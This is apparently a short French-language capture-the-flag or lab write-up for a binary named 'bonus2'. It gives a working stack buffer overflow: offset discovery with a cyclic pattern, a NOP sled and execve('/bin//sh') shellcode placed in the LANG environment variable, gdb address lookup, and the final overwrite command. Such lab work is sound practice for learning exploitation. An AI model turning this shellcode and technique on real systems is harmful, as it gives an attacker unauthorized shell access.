# bonus2

run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

0x08006241 pas d'offset

en changant la variable global LANG par fi
export LANG=fi
0x41366141 offset 18

# on va mettre notre shellcode dans la variable global LANG
export LANG=$(python -c 'print("fi" + "\x90" * 1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')

# pour ensuite remplacer par une adresse dans les x90 de l'env

(gdb) b *main+134
(gdb) run $(python -c 'print "\x90" * 40') Aa

x/20s *((char**)environ)
0xbffffeb3:	 "LANG=fi" 
0xbffffeb3 + 40 = bffffedb

# pour finalement envoyer cela

./bonus2 $(python -c 'print "\x90" * 40') $(python -c 'print "\x90" * 18 + "\xdb\xfe\xff\xbf"')
